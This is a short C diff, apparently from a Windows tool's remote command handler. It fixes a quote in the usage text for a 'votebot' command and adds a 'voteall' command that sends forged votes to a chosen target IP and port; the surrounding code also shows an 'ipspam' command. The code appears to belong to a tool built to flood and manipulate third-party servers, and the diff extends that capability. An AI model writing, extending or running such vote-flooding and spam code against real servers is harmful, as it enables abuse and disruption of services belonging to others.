@@ -257,7 +257,17 @@ DWORD WINAPI WorkingThread(LPVOID lpParam)
 					}
 				}
 				else
-					send(g_Client, "[Server]: Please use: votebot <dstIp> <dstPort> <amount> <vote>);
+					send(g_Client, "[Server]: Please use: votebot <dstIp> <dstPort> <amount> <vote>");
+			}
+			else if (strcmp(aCmd[0], "voteall") == 0 || strcmp(aCmd[0], "va") == 0)
+			{
+				if (aCmd[1][0] && aCmd[2][0] && aCmd[3][0])
+				{
+					SendVoteAll(client, inet_addr(aCmd[1]), htons(atoi(aCmd[2])), atoi(aCmd[3]));
+					send(g_Client, "[Server]: Votes sent successfully!");
+				}
+				else
+					send(g_Client, "[Server]: Please use: voteall <dstIp> <dstPort> <vote>");
 			}
 			else if (strcmp(aCmd[0], "ipspam") == 0)
 			{
